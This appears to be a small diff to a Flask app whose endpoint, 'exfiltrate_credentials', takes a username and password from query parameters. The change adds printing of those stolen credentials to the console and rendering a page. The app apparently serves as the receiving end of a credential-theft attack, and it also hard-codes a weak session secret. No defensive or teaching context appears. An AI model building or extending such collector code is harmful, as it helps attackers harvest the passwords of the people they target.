@@ -5,6 +5,7 @@ import os
 
 # Initialise Flask app
 app = Flask(__name__)
+app.config['SESSION_TYPE'] = 'filesystem'
 app.secret_key = 'cure51'  # Replace with a secure secret key
 
 # Initialize the session
@@ -111,7 +112,8 @@ def exfiltrate_credentials():
     password = request.args.get('password')
     if username and password:
         flash(f"Username: {username}, Password: {password}", category="success")
-        return '', 200
+        print(f"Username: {username}, Password: {password}")
+        return render_template('base.html'), 200
     else:
         return '', 400
 
